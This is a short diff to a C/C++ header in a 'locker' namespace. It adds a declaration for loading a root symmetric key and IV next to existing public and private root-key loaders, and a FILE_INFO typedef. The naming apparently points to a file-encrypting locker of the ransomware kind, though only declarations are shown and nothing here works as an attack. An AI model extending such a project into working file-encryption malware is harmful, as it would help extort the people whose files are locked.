@@ -33,10 +33,12 @@ namespace locker
 
 	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
 	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
+	VOID LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV);
 }
 
 typedef locker::HLIST HASH_LIST;
 typedef locker::HLIST* PHASH_LIST;
+typedef locker::FILE_INFO FILE_INFO;
 
 
 #endif
